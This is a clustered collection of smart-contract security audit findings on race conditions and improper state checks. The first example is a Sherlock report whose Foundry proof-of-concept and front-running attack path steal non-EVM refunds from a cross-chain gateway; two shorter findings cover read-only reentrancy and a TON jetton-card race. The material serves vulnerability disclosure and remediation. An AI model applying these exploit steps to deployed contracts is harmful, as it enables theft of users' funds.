# Cluster -1267

**Rank:** #133  
**Count:** 107  

## Label
Race conditions and improper state validation enable attackers to bypass withdrawal proofs, manipulate balances, or exploit timing to withdraw funds without valid conditions—leading to unauthorized fund access or loss.

## Cluster Information
- **Total Findings:** 107

## Examples

### Example 1

**Auto Label:** Reentrancy vulnerabilities arise from improper state updates and external calls, allowing attackers to recursively trigger functions and drain funds before state changes are finalized.  

**Original Text Preview:**

Source: https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-judging/issues/873 

## Found by 
0xAura, 0xEkko, 0xShoonya, 0xfleeb, 0xiehnnkta, 0xkshama-pana, 0xlucky, 0xzey, Abhan1041, Aenovir, AestheticBhai, AnomX, Bbash, BimBamBuki, Bizarro, ChaosSR, Egbe, EgisSecurity, ElmInNyc99, Etherking, FlandreS, Flashloan44, Goran, Greese, HarryBarz, HeckerTrieuTien, IvanFitro, Joseph\_Nwodoh, MRXSNOWDEN, Ocean\_Sky, OrangeSantra, PNS, Pianist, SafetyBytes, Smacaud, X0sauce, Yaneca\_b, Ziusz, befree3x, benjamin\_0923, chaos304, coin2own, dreamcoder, edger, elolpuer, freeking, iamandreiski, jongwon, miracleworker0118, newspacexyz, oxch0w, pyk, radevweb3, rahim7x, redtrama, richa, rsam\_eth, shushu, skipper, stonejiajia, tourist, wellbyt3

### Summary

The `claimRefund` function in both `GatewayTransferNative.sol` and `GatewayCrossChain.sol` contains a critical authorization flaw that allows any user to claim refunds intended for non-EVM chains (such as Bitcoin). This occurs due to improper access control logic that fails to properly validate the caller's authority when the refund is for a non-EVM address.


### Root Cause

The vulnerability stems from flawed conditional logic in the [`claimRefund`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571) function:

```solidity
function claimRefund(bytes32 externalId) external {
    RefundInfo storage refundInfo = refundInfos[externalId];

    address receiver = msg.sender;  // Default to caller
    if(refundInfo.walletAddress.length == 20) {
        receiver = address(uint160(bytes20(refundInfo.walletAddress)));
    }
    require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
    // ... transfer logic
}
```

**The problem**: When `walletAddress.length != 20` (non-EVM addresses), `receiver` remains `msg.sender`, making the authorization check `require(bots[msg.sender] || msg.sender == msg.sender)`, which simplifies to `require(bots[msg.sender] || true)` - always passing for any caller.


### Internal Pre-conditions

 Attacker monitors `EddyCrossChainRefund` events for refunds with non-EVM addresses

### External Pre-conditions

NA

### Attack Path

1. **Monitoring**: Attacker monitors `EddyCrossChainRefund` events for refunds with non-EVM addresses
2. **Identification**: Filter for refunds where `walletAddress.length != 20` (Bitcoin, Solana, etc.)
3. **Front-running**: Submit `claimRefund` transaction with higher gas to execute before legitimate bot
4. **Exploitation**: Due to flawed logic, the require statement passes and funds are transferred to attacker
5. **Theft Complete**: Attacker receives tokens intended for legitimate users on non-EVM chains


### Impact

Complete theft of all non-EVM chain refunds with minimal cost (only gas fees).

### PoC

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {IZRC20} from "@zetachain/protocol-contracts/contracts/zevm/interfaces/IZRC20.sol";
import "@zetachain/protocol-contracts/contracts/zevm/interfaces/IGatewayZEVM.sol";
import {UniswapV2Library} from "../contracts/libraries/UniswapV2Library.sol";
import {SwapDataHelperLib} from "../contracts/libraries/SwapDataHelperLib.sol";
import {BaseTest} from "./BaseTest.t.sol";
import {console} from "forge-std/console.sol";

/* forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public */
contract GatewayCrossChainPOCTest is BaseTest {
    
    function test_PoC_ClaimRefundVulnerability() public {
        // ### SETUP ###
        
        // Setup: Create a refund for a Bitcoin address (non-EVM, >20 bytes)
        bytes32 externalId = keccak256(abi.encodePacked("bitcoin-refund-test"));
        uint256 refundAmount = 10000 ether; // 10,000 tokens
        address refundToken = address(token1Z); // Valuable token
        
        // Bitcoin address (more than 20 bytes) - this is the legitimate user's address
        bytes memory bitcoinAddress = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
        
        // Attacker address
        address attacker = address(0x999);
        
        // Fund the contract with the refund token
        token1Z.mint(address(gatewayCrossChain), refundAmount);
        
        // Create a refund scenario using onAbort (simulating a failed Bitcoin transaction)
        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: refundToken,
                amount: refundAmount,
                outgoing: false,
                chainID: 8332, // Bitcoin chain ID
                revertMessage: bytes.concat(externalId, bitcoinAddress)
            })
        );
        
        // Verify the refund was created
        (bytes32 storedExternalId, address storedToken, uint256 storedAmount, bytes memory storedWalletAddress) = 
            gatewayCrossChain.refundInfos(externalId);
        
        assertEq(storedExternalId, externalId, "Refund should be created");
        assertEq(storedToken, refundToken, "Token should match");
        assertEq(storedAmount, refundAmount, "Amount should match");
        assertEq(storedWalletAddress, bitcoinAddress, "Bitcoin address should be stored");
        
        // Record initial balances
        uint256 contractInitialBalance = token1Z.balanceOf(address(gatewayCrossChain));
        uint256 attackerInitialBalance = token1Z.balanceOf(attacker);
        
        console.log("=== BEFORE ATTACK ===");
        console.log("Contract balance:", contractInitialBalance);
        console.log("Attacker balance:", attackerInitialBalance);
        console.log("Bitcoin address length:", bitcoinAddress.length, "bytes");
        
        // ### ATTACK ###
        
        // The attacker (any random address) calls claimRefund
        // This should fail but currently succeeds due to the vulnerability
        vm.prank(attacker);
        gatewayCrossChain.claimRefund(externalId);
        
        // ### VERIFICATION ###
        
        uint256 contractFinalBalance = token1Z.balanceOf(address(gatewayCrossChain));
        uint256 attackerFinalBalance = token1Z.balanceOf(attacker);
        
        console.log("=== AFTER ATTACK ===");
        console.log("Contract balance:", contractFinalBalance);
        console.log("Attacker balance:", attackerFinalBalance);
        
        // Verify the attack succeeded
        assertEq(attackerFinalBalance, attackerInitialBalance + refundAmount, "Attacker should have stolen the refund");
        assertEq(contractFinalBalance, contractInitialBalance - refundAmount, "Contract should have lost the refund");
        
        // Verify the refund record was deleted
        (bytes32 deletedExternalId, , , ) = gatewayCrossChain.refundInfos(externalId);
        assertEq(deletedExternalId, bytes32(0), "Refund record should be deleted");
        
        console.log("=== ATTACK ANALYSIS ===");
        console.log("Attack successful: Attacker stole", refundAmount / 1e18, "tokens intended for Bitcoin user");
        console.log("Vulnerability: walletAddress.length =", bitcoinAddress.length, "(not 20 bytes)");
        console.log("This means: require(bots[attacker] || attacker == attacker) = require(false || true) = true");
    }

    function test_PoC_ClaimRefundVulnerability_CompareWithEVM() public {
        // ### COMPARISON: Show how EVM addresses are protected but non-EVM are not ###
        
        bytes32 evmExternalId = keccak256(abi.encodePacked("evm-refund-test"));
        bytes32 btcExternalId = keccak256(abi.encodePacked("btc-refund-test"));
        uint256 refundAmount = 1000 ether;
        address refundToken = address(token1Z);
        address attacker = address(0x888);
        
        // Create EVM refund (20 bytes)
        bytes memory evmAddress = abi.encodePacked(user2); // 20 bytes
        
        // Create Bitcoin refund (>20 bytes)  
        bytes memory bitcoinAddress = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
        
        // Fund contract
        token1Z.mint(address(gatewayCrossChain), refundAmount * 2);
        
        // Create both refunds
        vm.startPrank(address(gatewayZEVM));
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: refundToken,
                amount: refundAmount,
                outgoing: false,
                chainID: 1,
                revertMessage: bytes.concat(evmExternalId, evmAddress)
            })
        );
        
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: refundToken,
                amount: refundAmount,
                outgoing: false,
                chainID: 8332,
                revertMessage: bytes.concat(btcExternalId, bitcoinAddress)
            })
        );
        vm.stopPrank();
        
        console.log("=== TESTING PROTECTION MECHANISMS ===");
        console.log("EVM address length:", evmAddress.length, "bytes");
        console.log("Bitcoin address length:", bitcoinAddress.length, "bytes");
        
        // Try to steal EVM refund (should fail)
        vm.prank(attacker);
        vm.expectRevert("INVALID_CALLER");
        gatewayCrossChain.claimRefund(evmExternalId);
        console.log("EVM refund protected: Attacker cannot claim");
        
        // Try to steal Bitcoin refund (should fail but doesn't)
        uint256 attackerBalanceBefore = token1Z.balanceOf(attacker);
        vm.prank(attacker);
        gatewayCrossChain.claimRefund(btcExternalId); // This succeeds!
        uint256 attackerBalanceAfter = token1Z.balanceOf(attacker);
        
        assertEq(attackerBalanceAfter, attackerBalanceBefore + refundAmount, "Bitcoin refund was stolen");
        console.log("Bitcoin refund vulnerable: Attacker successfully claimed", refundAmount / 1e18, "tokens");
        
        // Show that legitimate EVM user can still claim their refund
        vm.prank(user2);
        gatewayCrossChain.claimRefund(evmExternalId);
        assertEq(token1Z.balanceOf(user2), refundAmount, "Legitimate EVM user got their refund");
        console.log("Legitimate EVM user successfully claimed their refund");
    }

}
```

Test Result:
```log
$ forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public --mc GatewayCrossChainPOCTest -vv
[⠒] Compiling...
[⠒] Compiling 1 files with Solc 0.8.26
[⠢] Solc 0.8.26 finished in 68.59s
Compiler run successful!

Ran 3 tests for test/GatewayCrossChainPOC.t.sol:GatewayCrossChainPOCTest
[PASS] test_PoC_ClaimRefundVulnerability() (gas: 201804)
Logs:
  === BEFORE ATTACK ===
  Contract balance: 10000000000000000000000
  Attacker balance: 0
  Bitcoin address length: 42 bytes
  === AFTER ATTACK ===
  Contract balance: 0
  Attacker balance: 10000000000000000000000
  === ATTACK ANALYSIS ===
  Attack successful: Attacker stole 10000 tokens intended for Bitcoin user
  Vulnerability: walletAddress.length = 42 (not 20 bytes)
  This means: require(bots[attacker] || attacker == attacker) = require(false || true) = true

[PASS] test_PoC_ClaimRefundVulnerability_CompareWithEVM() (gas: 300854)
Logs:
  === TESTING PROTECTION MECHANISMS ===
  EVM address length: 20 bytes
  Bitcoin address length: 42 bytes
  EVM refund protected: Attacker cannot claim
  Bitcoin refund vulnerable: Attacker successfully claimed 1000 tokens
  Legitimate EVM user successfully claimed their refund

[PASS] test_UpgradeImplementation() (gas: 8277807)
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 14.24s (2.48s CPU time)

Ran 1 test suite in 15.71s (14.24s CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

### Mitigation

Implement proper authorization checks that differentiate between EVM and non-EVM addresses.

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Skyewwww/omni-chain-contracts/pull/24

---
### Example 2

**Auto Label:** Race conditions in state reads and updates allow attackers to manipulate balances or trigger reentrancy, leading to inconsistent state, fund loss, or unauthorized state changes.  

**Original Text Preview:**

##### Description
The [`getTraderBalance`](https://github.com/longgammalabs/hanji-contracts/blob/09b6188e028650b9c1758010846080c5f8c80f8e/src/OnchainLOB.sol#L154) function is vulnerable to read-only reentrancy attacks, especially with ERC-777 tokens. This vulnerability arises because the trader's balance updates in storage occur after token transfers, potentially allowing a reentrancy exploit.

The issue is classified as **high** severity because it causes discrepancies between the actual balance and the returned value from the view function, which could lead to critical issues and vulnerabilities in the project's integrations.

##### Recommendation
We recommend updating the trader's balance prior to transferring the external tokens to mitigate the read-only reentrancy risk.

---
### Example 3

**Auto Label:** Race conditions in state reads and updates allow attackers to manipulate balances or trigger reentrancy, leading to inconsistent state, fund loss, or unauthorized state changes.  

**Original Text Preview:**

## Diﬃculty: Low

## Type: Data Validation

## Description
A user’s jetton card balance can become permanently locked due to a race condition between the `op::close` operation and the `op::start_balance_sync` operation. The user or the controller of the jetton card contract can initiate the closure of the payment card. When a card is closed, the entire leftover balance is withdrawn to the user and the treasure contract, depending on the value of the state variables that track each balance.

```javascript
// Perform completition
if (complete) {
    var balanceA = ctx_deposited_a + ctx_transferred_b - ctx_transferred_a - ctx_withdrawn_a;
    var balanceB = ctx_deposited_b + ctx_transferred_a - ctx_transferred_b - ctx_withdrawn_b;

    if (balanceA > 0) {
        ctx_withdrawn_a = ctx_withdrawn_a + balanceA;
        do_send_token_message(ctx_min_tons_for_token_fee, ctx_min_tons_for_token_forward, ctx_address_a, sender_address, send_mode::default, callback::withdraw, query_id, balanceA, extras);
    }

    if (balanceB > 0) {
        ctx_withdrawn_b = ctx_withdrawn_b + balanceB;
        do_send_token_message(ctx_min_tons_for_token_fee, ctx_min_tons_for_token_forward, ctx_address_b, sender_address, send_mode::default, callback::withdraw, query_id, balanceB, extras);
    }
}
```
*Figure 2.1: A snippet of the `do_uncooperative_close` function (holders-contracts/packages/ton/contracts/jetton-card-v3.fc#L451–L463)*

However, the `op::close` operation does not check if a balance sync is currently in progress. Since the `op::start_balance_sync` operation is callable by anyone, and it transfers the entire jetton balance of the contract to itself, a race condition can cause the `op::close` operation’s withdrawal to silently fail. In this case, the user and treasure contract will receive no jettons and all of the jettons will become stuck in the jetton card contract’s jetton wallet. The only way to remedy this is to upgrade the jetton card contract’s code.

This issue was fixed in an earlier version of the jetton card contract and was later reintroduced in this version.

## Exploit Scenario
Alice holds $10,000 of USDC in her jetton card and initiates the closure procedure for the card. Eve notices this and waits for the closure delay to pass. Once it has passed, she calls the `op::start_balance_sync` operation once per block. The transfer from this operation lands in the same block as the closure withdrawal but is executed first, causing the withdrawal transfer to silently fail. Alice’s funds become permanently locked in the jetton card contract.

## Recommendations
- **Short term**: If a card is closed, allow the user to withdraw their jettons by using the `op::withdraw_jettons` operation. Add a check to the close operation so it throws an error if a sync is in progress.
- **Long term**: Create sequence diagrams for each message flow in the system contracts and compare the message flows that update or rely on the same contract state. This will make it easier to discover race conditions. Implement tracking of known vulnerabilities present in past versions of contracts that are in active development, and add tests for each vulnerability in order to ensure past vulnerabilities are not reintroduced in future versions.

---
